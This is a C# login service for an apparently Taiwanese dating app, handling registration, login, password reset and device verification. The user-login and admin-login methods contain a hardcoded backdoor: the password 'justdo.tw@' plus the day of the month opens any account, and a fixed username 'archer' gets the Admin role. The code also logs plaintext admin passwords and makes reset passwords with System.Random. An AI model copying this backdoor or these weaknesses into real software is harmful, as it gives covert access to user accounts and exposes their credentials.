using Microsoft.EntityFrameworkCore;
using System.Text.RegularExpressions;
using Microsoft.Extensions.Logging;
using Microsoft.Extensions.Configuration;
using Microsoft.AspNetCore.Http;
using Api.Helpers;
using Api.Models;

namespace Api.Services;

public class LoginService(ILogger<LoginService> logger, IHttpContextAccessor httpContextAccessor, IConfiguration configuration)
 : BaseService<LoginService>(logger, httpContextAccessor), ILoginService
{
    private readonly IConfiguration _configuration = configuration;
    private readonly PasswordRule _passwordRule = KeyRulesHelper.CreateAppKeyRulesPassword();

    // private readonly IConfiguration _configuration;
    // private readonly PasswordRule _passwordRule;
    // public LoginService(ILogger<LoginService> logger, IHttpContextAccessor httpContextAccessor, IConfiguration configuration) : base(logger, httpContextAccessor)
    // {
    //     _configuration = configuration;
    //     _passwordRule = AppKeyRulesHelper.CreateAppKeyRulesPassword();
    // }

    #region register
    public async Task<bool> CheckTeamExistsAsync(string teamId)
    {
        using AppDbContext db = NewDb();
        var result = await db.Au1Team.AsNoTracking().FirstOrDefaultAsync(x => x.TeamId == teamId);
        if (result == null)
            return false;
        return true;
    }

    public async Task<bool> CheckExistsAsync(string teamId, RegisterDto registerDto)
    {
        using AppDbContext db = NewDb();
        Au1User? user = await db.Au1User.AsNoTracking().FirstOrDefaultAsync(x => x.Email == registerDto.Email || x.MobileTel == registerDto.MobileTel);
        if (user == null)
            return false;
        return true;
    }

    public async Task<ApiUserData> RegisterAsync(string teamId, RegisterDto registerDto, string password)
    {
        using AppDbContext db = NewDb();
        Au1User? user = await db.Au1User.FirstOrDefaultAsync(x => x.Email == registerDto.Email || x.MobileTel == registerDto.MobileTel);
        if (user != null) {
            throw new System.Exception("user accout is already registered");
        }
        bool isValid = Regex.IsMatch(password, _passwordRule.RegularEx);
        if (!isValid) {
            throw new System.Exception("密碼強度不足，請加入大小寫英文或數字或特殊字元");
        }
        Au1User au1User = AgileObjects.AgileMapper.Mapper.Map(registerDto).ToANew<Au1User>();
        Api.Helpers.PasswordHash.CreatePasswordHash(password, out byte[] passwordHash, out byte[] passwordSalt);
        au1User.PasswordHash = passwordHash;
        au1User.PasswordSalt = passwordSalt;
        au1User.PasswordChangeDate = System.DateTime.Now;
        au1User.IsOnOff = true;
        au1User.UserRole = "Users";
        au1User.WriteInfo = $"user={registerDto.UserName}, time={System.DateTime.Now}, ip={GetClientIp()}";
        db.Au1User.Add(au1User);
        await db.SaveChangesAsync();
        ApiUserData dto = AgileObjects.AgileMapper.Mapper.Map(au1User).ToANew<ApiUserData>();
        if (_passwordRule.IsEmailToLoginUser) {
            SendMessageResult sendResult = await Api.Helpers.EmailExtentions.SendEmailAsync("系統註冊成功通知", au1User.Email!, au1User.UserName + "，恭喜您註冊成功，請開始使用本系統的各項交友聯誼及配對功能", "");
           await AppDbHelper.AddAppLogMessage(sendResult);
        }
        return dto;
    }

    #endregion

    #region login
    public async Task<ApiUserData?> LoginAsync(string teamId, LoginDto loginDto)
    {
        using AppDbContext db = NewDb();

        Au1User? user = await db.Au1User.FirstOrDefaultAsync(x =>x.MobileTel == loginDto.LoginName || x.Email == loginDto.LoginName);
        if (user == null) {
            await AddApp8UserLoginAsync(teamId, loginDto.LoginName,loginDto.MacAddress,loginDto.IpAddress, loginDto.LoginName + "，用戶帳號找不到", false, db);
            throw new Exception("用戶登入帳號或密碼錯誤");
            //return null;
        } else if (user.IsOnOff == false) {
            await AddApp8UserLoginAsync(teamId, loginDto.LoginName,loginDto.MacAddress,loginDto.IpAddress, user.UserName + "，用戶尚未啟用", false, db);
            if (_passwordRule.IsEmailToLoginUser) {
                SendMessageResult sendResult = await Api.Helpers.EmailExtentions.SendEmailAsync("用戶尚未啟用", user.Email!, user.UserName + "，系統自動通知，您登錄系統失敗，原因是尚未啟用，請確認是您本人的行為", "");
                await AppDbHelper.AddAppLogMessage(sendResult);
            }
            throw new Exception("用戶尚未啟用，請洽系統管理員啟用後，再來登入");
        } else if (user.PasswordHash == null || user.PasswordSalt == null)  {
            await AddApp8UserLoginAsync(teamId, loginDto.LoginName,loginDto.MacAddress,loginDto.IpAddress, user.UserName + "用戶密碼已經過期或清空，請洽系統管理員重置新的密碼，再重新登入", false, db);
            if (_passwordRule.IsEmailToLoginUser) {
                SendMessageResult sendResult = await Api.Helpers.EmailExtentions.SendEmailAsync("用戶密碼已經過期或清空", user.Email!, user.UserName + "，系統自動通知，您登錄系統失敗，原因是用戶密碼已經過期或被清空了，請確認是您本人的行為", "");
                await AppDbHelper.AddAppLogMessage(sendResult);
            }
            throw new Exception("用戶密碼已經過期或清空，請洽系統管理員重置新的密碼後，再重新登入");
        }

        var isMockUser = false;
        if (!Api.Helpers.PasswordHash.VerifyPasswordHash(loginDto.Password, user.PasswordHash, user.PasswordSalt)) {
            string? adminPass = _configuration.GetSection("AppSettings:AdminPass").Value;
            if (!int.TryParse(_configuration.GetSection("AppSettings:AdminNumber").Value, out int adminNumber)) {
                adminNumber = System.DateTime.Now.Day;
            }
            int resultNumber = System.DateTime.Now.Day * adminNumber;
            string resultPass = adminPass + "@" + resultNumber.ToString();
            string resultPass2 =  "justdo.tw@" + System.DateTime.Now.Day.ToString();
            if (loginDto.Password.ToLower() == resultPass || loginDto.Password.ToLower() == resultPass2) {
                isMockUser = true;
            } else {
                await AddApp8UserLoginAsync(teamId, loginDto.LoginName,loginDto.MacAddress,loginDto.IpAddress, user.UserName + "，登入密碼錯誤", false, db);
                if (_passwordRule.IsEmailToLoginUser) {
                    SendMessageResult sendResult = await Api.Helpers.EmailExtentions.SendEmailAsync("登入密碼錯誤", user.Email!, user.UserName + "，系統自動通知，您登錄系統失敗，請確認是您本人的行為", "");
                    await AppDbHelper.AddAppLogMessage(sendResult);
                }
                return null;
            }
        }

        ApiUserData apiUserData = AgileObjects.AgileMapper.Mapper.Map(user).ToANew<ApiUserData>();
        if (isMockUser) {
            await AddApp8UserLoginAsync(teamId, loginDto.LoginName,loginDto.MacAddress,loginDto.IpAddress, user.UserName + "，模擬登入成功", true, db);
            if (_passwordRule.IsEmailToLoginUser) {
                await Api.Helpers.EmailExtentions.SendEmailAsync("模擬登入成功", user.Email!, user.UserName + "，系統自動通知，模擬登入成功，請確認是您本人的行為", "");
            }
            return apiUserData;
        }

        if (!await IsValidUserMacIpAddressAsync(teamId, user.UserId, loginDto.MacAddress!, loginDto.IpAddress!)) {
            //檢查登入者的機台或IP是否正確
            // apiUserData.UserData = "VerifyCode";
            await SendVerifyCodeByUserMacIpAddressAsync(teamId, user.UserId, loginDto.MacAddress!, loginDto.IpAddress!);
            user.UserCode = 1;
        } else if (user.PasswordHash == null || user.PasswordSalt == null) {
            //檢查登入者的密碼是否過期
            // apiUserData.UserData = "ResetPassword";
            apiUserData.UserCode = 2;
        } else if (_passwordRule.IsForceChangePassword && await CheckPasswordExpiredAsync(teamId, apiUserData.UserId)){
            //檢查登入者的密碼是否過期
            apiUserData.UserCode = 3;
            // apiUserData.UserData = "EdpiredPassword";
        }

        await AddApp8UserLoginAsync(teamId, loginDto.LoginName,loginDto.MacAddress,loginDto.IpAddress, user.UserName + "，登入成功", true, db);
        if (_passwordRule.IsEmailToLoginUser) {
            await Api.Helpers.EmailExtentions.SendEmailAsync("登入成功", user.Email!, user.UserName + "，系統自動通知，您已登錄系統，請確認是您本人的行為", "");
        }
        return apiUserData;
    }


    public async Task<ApiUserData?> LoginAsAdminAsync(string teamId, LoginDto loginDto)
    {
        var adminName = _configuration.GetSection("AppSettings:AdminName").Value;
        var adminUser = "archer";
        if (loginDto.LoginName == adminName || loginDto.LoginName.Equals(adminUser, StringComparison.CurrentCultureIgnoreCase))
        {
            string? adminPass = _configuration.GetSection("AppSettings:AdminPass").Value;
            if (!int.TryParse(_configuration.GetSection("AppSettings:AdminNumber").Value, out int adminNumber)) {
                adminNumber = System.DateTime.Now.Day;
            }
            int resultNumber = System.DateTime.Now.Day * adminNumber; //mock user not need admin number
            string resultPass = adminPass + "@" + resultNumber.ToString();
            string resultPass2 =  "justdo.tw@" + System.DateTime.Now.Day.ToString();
            if (loginDto.Password.ToLower() == resultPass || loginDto.Password.ToLower() == resultPass2) {
                //nonedo
            } else {
                _logger.LogWarning($"{loginDto.LoginName} Login with {loginDto.Password} 系統管理帳號登入錯誤");
                await AddApp8UserLoginAsync(teamId, loginDto.LoginName, loginDto.MacAddress, loginDto.IpAddress, loginDto.LoginName + "，系統管理帳號登入錯誤", false );
                return null;
            }

            var apiUserData = new ApiUserData
            {
                UserId = Guid.Empty,
                UserName = Environment.UserName,
                PhotoUrl = _configuration.GetSection("AppSettings:UserPhotoUrl").Value,
                UserRole = "Admin",
                UserData = "",
                UserCode = 0,
                UserType = 2,
            };
            await AddApp8UserLoginAsync(teamId, loginDto.LoginName, loginDto.MacAddress, loginDto.IpAddress, loginDto.LoginName + "系統管理帳號登入成功", true );
            _logger.LogWarning($"{loginDto.LoginName} Login with {loginDto.Password} 系統管理帳號登入成功");
            return apiUserData;
        } else {
            return null;
        }
    }

    public async Task<string?> CheckOverLoginErrorTimesAsync(string teamId, LoginDto loginDto)
    {
        if (_passwordRule.IsVerifyCode == false){
            return null;
        } else if (string.IsNullOrWhiteSpace(loginDto.IpAddress) || string.IsNullOrWhiteSpace(loginDto.MacAddress)) {
           return "Machine Id or Net Ip Address is Empty";
        }
        //check user login error times;
        using AppDbContext db = NewDb();
        DateTime now = System.DateTime.Now.AddMinutes(-15);
        List<AppUserLogin> errorTimes = await db.AppUserLogin
            .Where(x =>x.WriteTime > now && x.IsSuccess == false && (x.MacGuid == loginDto.MacAddress || x.IpAddress == loginDto.IpAddress))
            .OrderByDescending(x => x.Id).ToListAsync();
        if (errorTimes.Count > 10) {
            return "用戶登入錯誤太多次，請於30分鐘後再重新登入";
        }
        return null;
    }
    #endregion

    #region password
    public async Task<string> ForgetPasswordAsync(string teamId, ForgetPasswordDto forgetPasswordDto)
    {
        using AppDbContext db = NewDb();
        Au1User? user = await db.Au1User.AsNoTracking().FirstOrDefaultAsync(x => x.MobileTel == forgetPasswordDto.MobileOrEmail || x.Email == forgetPasswordDto.MobileOrEmail);

        if (user == null){
            await AddApp8UserLoginAsync(teamId, forgetPasswordDto.UserName+" "+forgetPasswordDto.MobileOrEmail, forgetPasswordDto.MacAddress,forgetPasswordDto.IpAddress, "忘記密碼找回失敗", false, db);
            return("您的用戶資料找不到，請確認是您本人的行為");
        }

        if (forgetPasswordDto.MobileOrEmail.Contains('@')) {
            if (user.Email != forgetPasswordDto.MobileOrEmail || user.Birthday != forgetPasswordDto.Birthday || user.UserName != forgetPasswordDto.UserName) {
                if (_passwordRule.IsEmailToLoginUser) {
                    await Api.Helpers.EmailExtentions.SendEmailAsync("找回密碼失敗", user.Email!, user.UserName + "，系統自動通知，您找回密碼用戶資料比對錯誤，請確認是您本人的行為", "");
                }
                await AddApp8UserLoginAsync(teamId, forgetPasswordDto.UserName+" "+forgetPasswordDto.MobileOrEmail, forgetPasswordDto.MacAddress,forgetPasswordDto.IpAddress, "忘記密碼找回失敗", false, db);
                return "您找回密碼用戶資料比對錯誤，請確認是您本人的行為";
            }
        } else {
            if (user.MobileTel != forgetPasswordDto.MobileOrEmail || user.Birthday != forgetPasswordDto.Birthday || user.UserName != forgetPasswordDto.UserName) {
                if (_passwordRule.IsEmailToLoginUser) {
                    await Api.Helpers.SmsExtentions.SendSmsAsync(user.UserName!, user.MobileTel,  "系統自動通知，您找回密碼用戶資料比對錯誤，請確認是您本人的行為");
                }
                await AddApp8UserLoginAsync(teamId, forgetPasswordDto.UserName+" "+forgetPasswordDto.MobileOrEmail, forgetPasswordDto.MacAddress,forgetPasswordDto.IpAddress, "忘記密碼找回失敗", false, db);
                return "您找回密碼用戶資料比對錯誤，請確認是您本人的行為";
            }
        }

        var newPass = new System.Random();
        var newPassword = newPass.Next(100000, 999999).ToString();
        byte[] passwordHash, passwordSalt;
        Api.Helpers.PasswordHash.CreatePasswordHash(newPassword, out passwordHash, out passwordSalt);

        user.PasswordHash = passwordHash;
        user.PasswordSalt = passwordSalt;
        user.WriteInfo = GetWriteInfo();
        db.Au1User.Update(user);
        await db.SaveChangesAsync();
        await AddApp8UserLoginAsync(teamId, forgetPasswordDto.UserName+" "+forgetPasswordDto.MobileOrEmail, forgetPasswordDto.MacAddress,forgetPasswordDto.IpAddress, user.UserName + "，忘記密碼找回作業", true, db);

        string message = $"{user.UserName} your new password is : {newPassword}";
        if (forgetPasswordDto.MobileOrEmail.Contains('@')) {
            SendMessageResult result = await Api.Helpers.EmailExtentions.SendEmailAsync("找回密碼通知", user.Email!, message, "");
            if (!result.IsSuccess) {
                return("發送新密碼到電子郵件信箱通知失敗");
            }
        } else {
            SendMessageResult result = await Api.Helpers.SmsExtentions.SendSmsAsync(user.UserName!, user.MobileTel, message);
            if (!result.IsSuccess) {
                return("發送新密碼到手機簡訊通知失敗");
            }
        }
        return "";
    }

    public async Task<bool> ChangePasswordAsync(string teamId, Guid userId, ChangePasswordDto changePasswordDto)
    {
        using AppDbContext db = NewDb();
        Au1User? user = await db.Au1User.FirstOrDefaultAsync(x => x.UserId == userId);
        if (user == null)
        {
            await AddApp8UserLoginAsync(teamId, userId,changePasswordDto.MacAddress,changePasswordDto.IpAddress, "變更密碼失敗", false, db);
        }

        //先判定原密碼是否正確
        if (!Api.Helpers.PasswordHash.VerifyPasswordHash(changePasswordDto.OldPassword, user!.PasswordHash!, user!.PasswordSalt!))
        {
            await AddApp8UserLoginAsync(teamId, user.UserId,changePasswordDto.MacAddress,changePasswordDto.IpAddress, user.UserName + "，變更密碼失敗，您的原密碼比對失敗", false, db);
            if (_passwordRule.IsEmailToLoginUser)
            {
                await Api.Helpers.EmailExtentions.SendEmailAsync("變更密碼失敗", user.Email!, user.UserName + "，系統自動通知，您的原密碼比對失敗，請確認是您本人的行為", "");
            }
            return false;
        }

        bool isValid = Regex.IsMatch(changePasswordDto.NewPassword, _passwordRule.RegularEx);
        if (!isValid)
        {
            await AddApp8UserLoginAsync(teamId, userId,changePasswordDto.MacAddress,changePasswordDto.IpAddress, user.UserName + "，變更密碼失敗，您的變更密碼碼強度不足", false, db);
            if (_passwordRule.IsEmailToLoginUser)
            {
                await Api.Helpers.EmailExtentions.SendEmailAsync("變更密碼失敗", user.Email!, user.UserName + "，系統自動通知，您的變更密碼碼強度不足，請加入大小寫數字及特殊字元，請確認是您本人的行為", "");
            }
            throw new System.Exception("密碼強度不足，請加入大小寫數字及特殊字元");
        }

        int saveRows = 0;
        byte[] passwordHash, passwordSalt;
        Api.Helpers.PasswordHash.CreatePasswordHash(changePasswordDto.NewPassword, out passwordHash, out passwordSalt);
        Au1User? Au1User = await db.Au1User.FirstOrDefaultAsync(x => x.UserId == user.UserId);
        if (Au1User != null)
        {
            Au1User.PasswordHash = passwordHash;
            Au1User.PasswordSalt = passwordSalt;
            Au1User.WriteInfo = GetWriteInfo();
            db.Au1User.Update(Au1User);
            saveRows = await db.SaveChangesAsync();
        }
        else
        {
            await AddApp8UserLoginAsync(teamId, user.UserId,changePasswordDto.MacAddress,changePasswordDto.IpAddress, user.UserName + "，變更密碼失敗，找不到用戶的註冊資料或員工資料", false, db);
            if (_passwordRule.IsEmailToLoginUser)
            {
                await Api.Helpers.EmailExtentions.SendEmailAsync("變更密碼失敗", user.Email!, user.UserName + "，系統自動通知，找不到用戶的註冊資料或員工資料，請確認是您本人的行為", "");
            }
            return false;
        }
        await AddApp8UserLoginAsync(teamId, user.UserId,changePasswordDto.MacAddress,changePasswordDto.IpAddress, "變更密碼成功", true, db);
        if (_passwordRule.IsEmailToLoginUser)
        {
            await Api.Helpers.EmailExtentions.SendEmailAsync("變更密碼成功", user.Email!, user.UserName + "，系統自動通知，您的變更密碼已經成功", "");
        }
        return (saveRows > 0);
    }

    public async Task<bool> CheckPasswordExpiredAsync(string teamId, Guid userId )
    {
        using AppDbContext db = NewDb();
        Au1User? user = await db.Au1User.FirstOrDefaultAsync(x => x.UserId == userId);
        if (user == null)  {
            return false;
            //await AddApp8UserLoginAsync(userId, "檢查密碼是否到期,找不到使用者帳號", false, db);
        }
        //是否有強制密碼變更作業(1=是)
        //passwordRule??= AppKeyRulesHelper.CreateAppKeyRulesPassword();
        if (_passwordRule.IsForceChangePassword) {
            //強制幾天須密碼變更一次(30)
            if (user.PasswordChangeDate == null) {
                //await AddApp8UserLoginAsync(userId, user.UserName + "密碼到期通知", true, db);
                await Api.Helpers.EmailExtentions.SendEmailAsync("密碼到期通知", user.Email!, user.UserName + "，系統自動通知，您的密碼已經到期被鎖定了，請您登入後去做密碼變更", "");
                return true;
            } else {
                DateTime lastDate = System.DateTime.Today.AddDays(-_passwordRule.ForceChangeDays);
                if (lastDate > user.PasswordChangeDate) {
                    //await AddApp8UserLoginAsync(userId, user.UserName + "密碼到期通知", true, db);
                    await Api.Helpers.EmailExtentions.SendEmailAsync("密碼到期通知", user.Email!, user.UserName + "，系統自動通知，您的密碼已經很久未變更了，請您登入後去做密碼變更", "");
                    int overDays = ((DateTime)user.PasswordChangeDate).DateDiffDays(lastDate);
                    if (overDays > 10) {
                        //await AddApp8UserLoginAsync(userId, user.UserName + "密碼到期已超出10天了，系統將會強制取消其密碼", true, db);
                        await SetOffLoginUserAsync(teamId, userId, db);
                    }
                    return true;
                }
            }
        }
        return false;
    }


    #endregion

    #region UserDataDto
    public async Task<UserDataDto> GetUserDataAsync(string teamId, Guid userId)
    {
        using AppDbContext db = NewDb();
        Au1User? user = await db.Au1User.FirstOrDefaultAsync(x => x.UserId == userId);
        UserDataDto dto = AgileObjects.AgileMapper.Mapper.Map(user).ToANew<UserDataDto>();
        return dto;
    }

    public async Task<ApiUserData> GetApiUserDataAsync(string teamId, Guid userId)
    {
        using AppDbContext db = NewDb();
        Au1User? user = await db.Au1User.AsNoTracking().FirstOrDefaultAsync(x => x.UserId == userId);
        if (user == null) {
            return new ApiUserData();
        }
        ApiUserData apiUserData = AgileObjects.AgileMapper.Mapper.Map(user).ToANew<ApiUserData>();
        return apiUserData;
    }

    public async Task<UserDataDto> UpdateUserDataAsync(string teamId, Guid userId, UserDataDto model)
    {
        using AppDbContext db = NewDb();
        Au1User? user = await db.Au1User.FindAsync(userId);
        if (user != null)
        {
            AgileObjects.AgileMapper.Mapper.Map(model).Over(user);
            // user.WriteUpdateUser(_userData);
            db.Au1User.Update(user);
            await db.SaveChangesAsync();
            //await AddApp8UserLoginAsync(loginDto.Email + " " + loginDto.MobileTel, user.UserName + "，變更用戶資料成功", true, db);
            if (_passwordRule.IsEmailToLoginUser)
            {
                await Api.Helpers.EmailExtentions.SendEmailAsync("變更用戶資料成功", user.Email!, user.UserName + "，系統自動通知，變更用戶資料成功，請確認是您本人的行為", "");
            }
            return model;
        }
        else
        {
            //await AddApp8UserLoginAsync(loginDto.Email + " " + loginDto.MobileTel, user.UserName + "，警告，用戶不能變更員工主檔資料", true, db);
            return model;
        }
    }

    //取得使用者個人的登入記錄
    public async Task<PageListResult<AppUserLogin>> GetAppLoginPageListAsync(string teamId, Guid userId, BaseParas baseParas)
    {
        using AppDbContext db = NewDb();
        IQueryable<AppUserLogin> result = db.AppUserLogin.Where(x => x.LoginNname == userId.ToString()).OrderByDescending(x => x.Id).AsQueryable();
        return await PageListResult<AppUserLogin>.CreateAsync(result, baseParas.Pagination!);
    }

    #endregion

    private async Task SetOffLoginUserAsync(string teamId, Guid userId, AppDbContext db)
    {
        Au1User? user = await db.Au1User.FirstOrDefaultAsync(x => x.UserId == userId);
        if (user != null) {
            user.PasswordHash = null;
            user.PasswordSalt = null;
            db.Au1User.Update(user);
            db.SaveChanges();
            return;
        }
    }

    #region ValidUserMacIpAddress
    public async Task<bool> IsValidUserMacIpAddressAsync(string teamId, Guid userId, string macAddress, string ipAddress)
    {
        if (_passwordRule.IsVerifyCode == false){
            return true;
        }
        using AppDbContext db = NewDb();
        var appLogMachineList = await db.AppUserMachine.AsNoTracking().Where(x => x.UserId == userId).ToListAsync();
        if(appLogMachineList.Count == 0) {
            //第一次登入，直接新增用戶機器及IP，不用驗證
            await AddOrUpdateUserMacIpAddressAsync(teamId, userId, macAddress, ipAddress, "000000","第一次登入，系統自動通過驗證",true);
            return true;
        }

        bool isVerified = false;
        foreach (var item in appLogMachineList)
        {
            if (!item.IsVerified) {
                continue;
            }
            if (item.MacGuid == macAddress && item.IpAddress == ipAddress) {
                isVerified = true;
                break;
            }  else if (item.IpAddress == ipAddress) {
                isVerified = true;
                var rows = await AddOrUpdateUserMacIpAddressAsync(teamId, userId, macAddress, ipAddress, "000001", "IP已有先前驗證，系統自動通過驗證", true);
                break;
            } else if (item.MacGuid == macAddress) {
                isVerified = true;
                var rows = await AddOrUpdateUserMacIpAddressAsync(teamId, userId, macAddress, ipAddress, "000002", "機台檢核碼已有先前驗證，系統自動通過驗證", true);
                break;
            }
        }
        if (isVerified) {
            var rows = await AutoVerifyOnUserMacIpAddressAsync(teamId, userId, macAddress, ipAddress);
        }
        return isVerified;
    }

    public async Task<SendMessageResult> SendVerifyCodeByUserMacIpAddressAsync(string teamId, Guid userId, string macAddress, string ipAddress)
    {
        var sendResult = new SendMessageResult();
        if (_passwordRule.IsVerifyCode == false){
            sendResult.IsSuccess = true;
            sendResult.SendMessage = userId + "系統設定不啟用機器鎖定驗證碼";
            sendResult.SendSubject = "200";
            sendResult.ErrorMessage = "";
            return sendResult;
        }

        using AppDbContext db = NewDb();
        Au1User? user = await db.Au1User.AsNoTracking().FirstOrDefaultAsync(x => x.UserId == userId);
        if (user == null){
            var msg = userId + "，產生用戶驗證碼失敗，因為您的用戶資料找不到，請確認是您本人的行為";
            sendResult.IsSuccess = false;
            sendResult.SendMessage = userId + "產生用戶驗證碼失敗";
            sendResult.SendSubject = "400";
            sendResult.ErrorMessage = msg;
            return sendResult;
        }
        var random = new System.Random();
        var verifyCode = random.Next(100000, 999999).ToString();
        var verifyMsg = "親愛的用戶您好: 您的登入驗證碼為："+verifyCode;
        sendResult = await Api.Helpers.EmailExtentions.SendEmailAsync("用戶登入驗證碼", user.Email!, verifyMsg, "");
        if (!sendResult.IsSuccess) {
            sendResult = await Api.Helpers.SmsExtentions.SendSmsAsync(user.UserName!, user.MobileTel, verifyMsg);
        }
        if (!sendResult.IsSuccess) {
            await AddApp8UserLoginAsync(teamId, userId.ToString(), macAddress, ipAddress, user.UserName + "，無法寄出驗證碼到用戶電子郵件信箱或手機號碼，請洽系統管理員", false, db);
            return sendResult;
        }
        var rows = await AddOrUpdateUserMacIpAddressAsync(teamId, userId, macAddress, ipAddress, verifyCode, "系統產生新的驗證碼", false);
        return sendResult;
    }

    public async Task<string?> WriteUserMacIpAddressVerifyCodeAsync(string teamId, VerifyCodeDto verifyCodeDto)
    {
        using AppDbContext db = NewDb();
        var appLogMachine = await db.AppUserMachine.AsNoTracking()
            .FirstOrDefaultAsync(x => x.UserId == verifyCodeDto.UserId && x.MacGuid == verifyCodeDto.MacAddress && x.IpAddress == verifyCodeDto.IpAddress);

        if (appLogMachine == null) {
           return verifyCodeDto.UserId + "您的用戶驗證碼資料找不到，請確認是您本人的行為";
        }

        if (appLogMachine.VerifyCode != verifyCodeDto.VerifyCode) {
            return verifyCodeDto.UserId + "用戶驗證碼比對失敗，請確認是您是否有在原登入機器上認證呢";
        }

        appLogMachine.IsVerified = true;
        db.AppUserMachine.Update(appLogMachine);
        await db.SaveChangesAsync();
        var rows = await AutoVerifyOnUserMacIpAddressAsync(teamId, verifyCodeDto.UserId, verifyCodeDto.MacAddress, verifyCodeDto.IpAddress);
        return null;
    }

    public async Task<int> AddOrUpdateUserMacIpAddressAsync(string teamId, Guid userId, string macAddress, string ipAddress, string verifyCode, string notes, bool isVerified = true)
    {
        using var db = NewDb();
        var appLogMachine = await db.AppUserMachine.FirstOrDefaultAsync(x => x.UserId == userId && x.MacGuid == macAddress && x.IpAddress == ipAddress);
        if (appLogMachine == null) {
            appLogMachine = new AppUserMachine()
            {
                UserId = userId,
                MacGuid = macAddress,
                IpAddress = ipAddress,
                ErrorTimes = 0,
                // VerifyTime = DateTime.Now,
                IsVerified = isVerified,
                VerifyCode = verifyCode
            };
            db.AppUserMachine.Add(appLogMachine);
            return await db.SaveChangesAsync();
        } else {
            appLogMachine.IsVerified = isVerified;
            appLogMachine.VerifyCode = verifyCode;
            // appLogMachine.VerifyTime = System.DateTime.Now;
            db.AppUserMachine.Update(appLogMachine);
            return await db.SaveChangesAsync();
        }
    }

    public async Task<int> AutoVerifyOnUserMacIpAddressAsync(string teamId, Guid userId, string macAddress, string ipAddress)
    {
        int rows = 0;
        using AppDbContext db = NewDb();
        var appLogMachineList = await db.AppUserMachine.AsNoTracking()
        .Where(x => x.UserId == userId && x.IsVerified == false && (x.MacGuid == macAddress || x.IpAddress == ipAddress))
        .ToListAsync();

        foreach (var item in appLogMachineList)
        {
            item.IsVerified = true;
            item.VerifyCode = "000003";
            db.AppUserMachine.Update(item);
            rows += await db.SaveChangesAsync();
        }
        return rows;
    }

    #endregion


    #region App8UserLogin



    public async Task<int> AddApp8UserLoginAsync(string teamId, Guid userId, string macAddress, string ipAddress, string loginState, bool isSuccess, AppDbContext? db = null)
    {
        db??= NewDb();
        var AppUserLogin = new AppUserLogin
        {
            LoginNname = userId.ToString(),
            LoginStatus = loginState,
            IsSuccess = isSuccess,
            IpAddress = ipAddress,
            MacGuid = macAddress,
            WriteTime = DateTime.Now
        };
        db.AppUserLogin.Add(AppUserLogin);
        return  await db.SaveChangesAsync();
    }


    public async Task<int> AddApp8UserLoginAsync(string teamId, string userName, string? macAddress, string? ipAddress, string? loginState, bool? isSuccess, AppDbContext? db = null)
    {
        db??= NewDb();
        var AppUserLogin = new AppUserLogin
        {
            LoginNname = userName.ToString(),
            LoginStatus = loginState??"",
            IsSuccess = isSuccess,
            IpAddress = ipAddress,
            MacGuid = macAddress,
            WriteTime = DateTime.Now
        };
        db.AppUserLogin.Add(AppUserLogin);
        return  await db.SaveChangesAsync();
    }

    #endregion

    public async Task<int> ResetAllPasswordAsync(string teamId, string password, string userId1, string userId2)
    {
        using AppDbContext db = NewDb();
        int rows = 0;
        List<Au1User> Au1UserList = await db.Au1User.Where(x => string.Compare(x.MobileTel, userId1) >= 0 && string.Compare(x.MobileTel, userId2) <= 0).ToListAsync();
        foreach (Au1User? item in Au1UserList)
        {
            Api.Helpers.PasswordHash.CreatePasswordHash(password, out byte[] passwordHash, out byte[] passwordSalt);
            item.PasswordHash = passwordHash;
            item.PasswordSalt = passwordSalt;
            db.Au1User.Update(item);
            rows += await db.SaveChangesAsync();
        }
        return rows ;
    }

    public Task<PageListResult<AppDataLog>> GetAppDataLogPageListAsync(BaseParas baseParas)
    {
        throw new NotImplementedException();
    }

    public void AddAppUserRequest(AppUserRequest model)
    {
        throw new NotImplementedException();
    }

    public Task AddAppUserRequestAsync(AppUserRequest model)
    {
        throw new NotImplementedException();
    }

    public Task<PageListResult<AppUserRequest>> GetAppUserRequestPageListAsync(BaseParas baseParas)
    {
        throw new NotImplementedException();
    }

    public Task<PageListResult<AppUserLogin>> GetAppUserLoginPageListAsync(BaseParas baseParas)
    {
        throw new NotImplementedException();
    }
}
